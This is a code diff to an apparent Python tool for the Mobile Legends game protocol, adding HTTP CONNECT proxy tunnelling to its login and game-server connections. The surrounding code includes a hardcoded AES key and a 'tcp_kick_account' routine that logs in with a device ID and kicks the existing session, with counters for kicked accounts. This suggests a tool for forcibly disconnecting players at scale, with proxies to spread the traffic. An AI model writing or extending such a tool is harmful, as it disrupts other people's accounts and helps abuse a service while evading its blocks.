@@ -1,7 +1,8 @@
-import socket, struct, zstandard as zstd, zlib, time, hashlib, threading, sys, os, json, uuid, argparse, random
+import socket, struct, zstandard as zstd, zlib, time, hashlib, threading, sys, os, json, uuid, argparse, random, base64
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from Crypto.Cipher import AES
+from urllib.parse import urlparse
 
 AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
 AES_IV = b'\x00' * 16
@@ -18,8 +19,42 @@ GLOBAL_SERVERS = [
 ACCOUNT_API = "https://accountmtapi.mobilelegends.com/"
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
+PROXY_URL = os.environ.get("PROXY_URL", "")
+
 stats = {'success': 0, 'failed': 0, 'timeout': 0, 'total': 0, 'errors': 0, 'kicked': 0}
 stats_lock = threading.Lock()
+
+def http_connect_tunnel(proxy_url, target_host, target_port, timeout=10):
+    if not proxy_url:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((target_host, target_port))
+        return s
+    parsed = urlparse(proxy_url)
+    proxy_host = parsed.hostname
+    proxy_port = parsed.port or 8080
+    auth = None
+    if parsed.username and parsed.password:
+        auth = base64.b64encode(f"{parsed.username}:{parsed.password}".encode()).decode()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.connect((proxy_host, proxy_port))
+    connect_req = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n"
+    if auth:
+        connect_req += f"Proxy-Authorization: Basic {auth}\r\n"
+    connect_req += "\r\n"
+    s.send(connect_req.encode())
+    resp = b""
+    while b"\r\n\r\n" not in resp:
+        chunk = s.recv(4096)
+        if not chunk:
+            raise ConnectionError("proxy closed connection before sending response")
+        resp += chunk
+    status_line = resp.split(b"\r\n")[0].decode()
+    if "200" not in status_line:
+        s.close()
+        raise ConnectionError(f"proxy CONNECT failed: {status_line}")
+    return s
 
 def _varint(val):
     buf = bytearray()
@@ -212,13 +247,11 @@ def tcp_login(device_id, host, port, timeout=10):
         try: s.close()
         except: pass
 
-def tcp_kick_account(device_id, host, port, timeout=10):
+def tcp_kick_account(device_id, host, port, timeout=10, proxy_url=''):
     """Full TCP kick: login -> get game server -> game handshake -> kicks old session."""
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(timeout)
     try:
-        s.connect((host, port))
-        print(f"[DEBUG] tcp_kick: connected to {host}:{port}")
+        s = http_connect_tunnel(proxy_url, host, port, timeout)
+        print(f"[DEBUG] tcp_kick: connected to {host}:{port} (proxy={'yes' if proxy_url else 'no'})")
         seq = 1
         # ---- Step 1: Login (packet 1) ----
         parts = device_id.split('_')
@@ -262,9 +295,7 @@ def tcp_kick_account(device_id, host, port, timeout=10):
         gs_port = int(gs_port)
         s.close()  # done with login server
         # ---- Step 3: Connect to game server & send handshake ----
-        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        gs.settimeout(timeout)
-        gs.connect((gs_host, gs_port))
+        gs = http_connect_tunnel(proxy_url, gs_host, gs_port, timeout)
         print(f"[DEBUG] tcp_kick: connected to game server {gs_host}:{gs_port}")
         hs = build_sdp({0: account_id, 1: session_key, 2: zid, 4: CLIENT_VERSION, 13: CHANNEL, 15: device_id})
         send_sdp(gs, 10001, 1, hs)
